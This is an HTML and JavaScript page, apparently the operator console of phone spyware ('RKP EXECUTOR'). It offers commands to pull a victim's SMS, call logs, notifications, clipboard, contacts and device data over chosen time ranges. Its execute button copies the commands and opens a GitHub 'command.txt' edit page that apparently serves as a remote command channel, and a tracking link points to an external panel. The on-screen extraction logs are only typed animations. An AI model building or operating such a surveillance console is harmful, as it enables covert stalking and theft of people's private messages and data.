<!DOCTYPE html>
<html lang="en">
<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>RKP ROOT ACCESS</title>

<link rel="stylesheet" href="styles.css">

<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700&display=swap" rel="stylesheet">

</head>
<body>


<canvas id="matrix"></canvas>


<div class="terminal">

<div class="header">

<div class="title">ROOT ACCESS :: RKP EXECUTOR</div>

<button class="contact-btn"
onclick="window.open('https://rahulpuri.fun/RKP-ControlPanel/Tracking/','_blank')">
TRACKING
</button>

</div>



<!-- COMMAND LIST -->
<div class="commands">

<div class="command popup-trigger" data-base="apps">ğŸ“± apps</div>

<div class="command popup-trigger" data-base="apps installed">ğŸ“¦ apps installed</div>

<div class="command popup-trigger" data-base="sms">ğŸ’¬ sms</div>

<div class="command popup-trigger" data-base="calls">ğŸ“ calls</div>

<div class="command popup-trigger" data-base="notification">ğŸ”” notification</div>

<div class="command popup-trigger" data-base="clipboard">ğŸ“‹ clipboard</div>


<div class="command" data-cmd="contacts full">ğŸ‘¤ contacts full</div>

<div class="command" data-cmd="deviceinfo">â„¹ï¸ deviceinfo</div>

<div class="command" data-cmd="connection">ğŸŒ connection</div>

<div class="command" data-cmd="none">ğŸš« none</div>

</div>



<div class="output" id="output"></div>

<div class="run-panel" id="runPanel">

<button class="run-btn" onclick="runSelected()">
EXECUTE SEQUENCE
</button>

</div>

</div>



<!-- POPUP -->
<div id="rangePopup" class="popup">

<div class="popup-box">

<div class="popup-title">SELECT RANGE</div>

<div class="popup-options">

<button onclick="selectRange('full')">FULL</button>

<button onclick="selectRange('1d')">1 DAY</button>

<button onclick="selectRange('7d')">7 DAYS</button>

<button onclick="selectRange('30d')">30 DAYS</button>

</div>

<button class="popup-close" onclick="closePopup()">CLOSE</button>

</div>

</div>



<script>


/* ================= MATRIX ================= */

const canvas=document.getElementById('matrix');
const ctx=canvas.getContext('2d');

let fontSize=14;
let columns;
let drops;

const chars="01ã‚¢ã‚«ã‚µã‚¿ãƒŠãƒãƒãƒ¤ãƒ©ãƒ¯";

function init(){

canvas.width=window.innerWidth;
canvas.height=window.innerHeight;

columns=Math.floor(canvas.width/fontSize);

drops=Array(columns).fill(1);

}

function draw(){

ctx.fillStyle='rgba(0,0,0,0.05)';
ctx.fillRect(0,0,canvas.width,canvas.height);

ctx.fillStyle='#00ffcc';
ctx.font=fontSize+"px monospace";

for(let i=0;i<drops.length;i++){

const text=chars[Math.floor(Math.random()*chars.length)];

ctx.fillText(text,i*fontSize,drops[i]*fontSize);

if(drops[i]*fontSize>canvas.height && Math.random()>0.975)
drops[i]=0;

drops[i]++;

}

}

init();
setInterval(draw,50);



/* ================= TERMINAL ENGINE ================= */

const output=document.getElementById("output");

const runPanel=document.getElementById("runPanel");

let selected=new Set();

let alreadyExecuted=new Set();

let queue=[];

let typing=false;

const TYPE_SPEED=6;

const redirectURL="https://github.com/MOFO-UG/ControlTheWorld/edit/main/command.txt";



const logDB={

apps:[
"[+] Scanning installed APPS...",
"[+] Reading APP registry...",
"[+] Extracting APP metadata...",
"[+] APP scan complete"
],

sms:[
"[+] Locating SMS database...",
"[+] Decrypting SMS storage...",
"[+] Extracting SMS records...",
"[+] SMS extraction complete"
],

calls:[
"[+] Accessing CALL interface...",
"[+] Reading CALL logs...",
"[+] CALL extraction complete"
],

notification:[
"[+] Accessing NOTIFICATION service...",
"[+] Reading NOTIFICATION buffer...",
"[+] NOTIFICATION capture complete"
],

clipboard:[
"[+] Accessing CLIPBOARD service...",
"[+] Reading clipboard buffer...",
"[+] Clipboard extraction complete"
],

contacts:[
"[+] Accessing CONTACT database...",
"[+] CONTACT extraction complete"
],

deviceinfo:[
"[+] Reading DEVICE kernel...",
"[+] DEVICE scan complete"
],

connection:[
"[+] Reading network interfaces...",
"[+] Connection upload complete"
],

none:[
"[+] Null sequence initialized..."
]

};



function updateExecuteButton(){

if(typing)
runPanel.style.display="none";
else
runPanel.style.display=selected.size?"block":"none";

}



function addLogs(cmd){

if(alreadyExecuted.has(cmd))return;

alreadyExecuted.add(cmd);

let base=getBase(cmd);

if(logDB[base])
logDB[base].forEach(log=>queue.push(log));

if(!typing)
typeNext();

}



function getBase(cmd){

if(cmd.startsWith("apps")) return "apps";

if(cmd.startsWith("sms")) return "sms";

if(cmd.startsWith("calls")) return "calls";

if(cmd.startsWith("notification")) return "notification";

if(cmd.startsWith("clipboard")) return "clipboard";

if(cmd.startsWith("contacts")) return "contacts";

if(cmd.startsWith("deviceinfo")) return "deviceinfo";

if(cmd.startsWith("connection")) return "connection";

return "none";

}



function typeNext(){

if(queue.length===0){

typing=false;

updateExecuteButton();

return;

}

typing=true;

updateExecuteButton();

let text=queue.shift();

let line=document.createElement("div");

output.appendChild(line);

let i=0;

function type(){

if(i<text.length){

line.textContent+=text[i++];

output.scrollTop=output.scrollHeight;

setTimeout(type,TYPE_SPEED);

}

else typeNext();

}

type();

}



/* ================= POPUP SYSTEM ================= */

let popupBase=null;

const popup=document.getElementById("rangePopup");

document.querySelectorAll(".popup-trigger").forEach(btn=>{

btn.onclick=()=>{

popupBase=btn.dataset.base;

popup.style.display="flex";

};

});



function closePopup(){

popup.style.display="none";

}



function selectRange(range){

closePopup();

let cmd = popupBase + " " + range;

toggleCommand(cmd);

}



/* ================= COMMAND TOGGLE ================= */

function toggleCommand(cmd){

if(selected.has(cmd)){

selected.delete(cmd);

}

else{

selected.add(cmd);

addLogs(cmd);

}

updateExecuteButton();

}



/* ================= EXECUTE ================= */

function runSelected(){

if(selected.size===0)return;

const outputText=[...selected].join(", ");

navigator.clipboard.writeText(outputText).then(()=>{

queue.push("root@RKPexecutor:~# executing root sequence...");

if(!typing)
typeNext();

setTimeout(()=>{

window.open(redirectURL,'_blank');

},1000);

});

}



/* ================= START ================= */

queue.push("root@RKPexecutor:~# _");

typeNext();


</script>


</body>
</html>
